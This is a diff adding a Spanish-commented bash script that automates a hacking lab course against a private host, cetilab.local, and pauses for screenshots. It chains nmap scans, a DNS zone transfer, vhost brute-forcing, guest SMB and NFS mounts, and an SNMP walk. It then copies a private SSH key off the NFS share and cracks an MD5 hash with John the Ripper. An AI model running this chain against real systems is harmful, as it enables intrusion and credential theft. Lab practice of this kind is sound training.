@@ -1,0 +1,78 @@
+#!/bin/bash
+
+# Script de automatizacion interactiva para practicas de Hacking
+IP_TARGET="192.168.1.101"
+USER_HOME=$(eval echo ~$SUDO_USER)
+
+function pause_for_screenshot() {
+    echo -e "\n[+] Comando finalizado. TOMA TU CAPTURA DE PANTALLA AHORA."
+    read -p "Presiona [ENTER] para continuar a la siguiente practica..."
+}
+
+echo "=== LIMPIEZA PREVIA DE HOSTS ==="
+sed -i '/192.168.1.101/d' /etc/hosts
+sed -i '/cetilab\.local/d' /etc/hosts
+echo "Archivos residuales de hosts limpiados."
+
+echo "=== PRACTICA 1: NMAP Y DESCUBRIMIENTO ==="
+nmap -sn 192.168.1.0/24
+nmap -sC -sV $IP_TARGET
+pause_for_screenshot
+
+echo "=== PRACTICA 2: REGISTRO DNS INICIAL ==="
+echo "$IP_TARGET admin-backup" >> /etc/hosts
+echo "Ping a admin-backup para comprobar:"
+ping -c 3 admin-backup
+pause_for_screenshot
+
+echo "=== PRACTICA 2.5: TRANSFERENCIA DE ZONA ==="
+dig @$IP_TARGET cetilab.local -t axfr
+pause_for_screenshot
+
+echo "=== AUTOMATIZACION: AGREGANDO SUBDOMINIOS A /etc/hosts ==="
+echo "$IP_TARGET cetilab.local app.cetilab.local db-mongo.cetilab.local db-mysql.cetilab.local files.cetilab.local ftp.cetilab.local mail.cetilab.local nfs.cetilab.local ns1.cetilab.local snmp.cetilab.local ssh.cetilab.local www.cetilab.local" >> /etc/hosts
+echo "Cat a /etc/hosts para tu captura:"
+tail -n 3 /etc/hosts
+pause_for_screenshot
+
+echo "=== PRACTICA 3: GOBUSTER ==="
+gobuster vhost -u http://cetilab.local -w /usr/share/dirb/wordlists/diccionario.txt
+pause_for_screenshot
+
+echo "=== PRACTICA 4: BURP SUITE ==="
+echo "Esta practica es grafica (FoxyProxy + Burp SQLi)."
+echo "Una vez termines la practica 4 y tengas las credenciales, vuelve aqui."
+pause_for_screenshot
+
+echo "=== PRACTICA 5: SMBMAP Y MONTAJE SMB ==="
+smbmap -H cetilab.local
+mkdir -p /mnt/archivoCompartido
+mount -t cifs //app.cetilab.local/archivos_ti /mnt/archivoCompartido -o guest,domain=cetilab.local
+ls -la /mnt/archivoCompartido
+pause_for_screenshot
+
+echo "=== PRACTICA 5.5: SNMP ==="
+snmpwalk -v 2c -c public cetilab.local
+pause_for_screenshot
+
+echo "=== PRACTICA 5.6: MONTAJE NFS Y LLAVE SSH ==="
+mkdir -p /mnt/respaldos
+mount -t nfs cetilab.local:/srv/nfs/respaldos_ti /mnt/respaldos
+echo "Copiando llave SSH a tu carpeta personal..."
+cp /mnt/respaldos/developer.key $USER_HOME/
+chown $SUDO_USER:$SUDO_USER $USER_HOME/developer.key
+chmod 600 $USER_HOME/developer.key
+ls -la $USER_HOME/developer.key
+pause_for_screenshot
+
+echo "=== PRACTICA 6: CRACKEO DE HASH (JOHN THE RIPPER) ==="
+echo "fcd065c1541dc1f64cce023e9f9e4900" > $USER_HOME/hash_practica6.txt
+chown $SUDO_USER:$SUDO_USER $USER_HOME/hash_practica6.txt
+echo "Iniciando ataque con mascara Ceti?d?d?d?d..."
+john --format=raw-md5 --mask=Ceti?d?d?d?d $USER_HOME/hash_practica6.txt
+john --show --format=raw-md5 $USER_HOME/hash_practica6.txt
+pause_for_screenshot
+
+echo "=== FIN DEL SCRIPT ==="
+echo "Para conectarte por SSH ahora solo debes usar:"
+echo "ssh -i $USER_HOME/developer.key developer@cetilab.local"
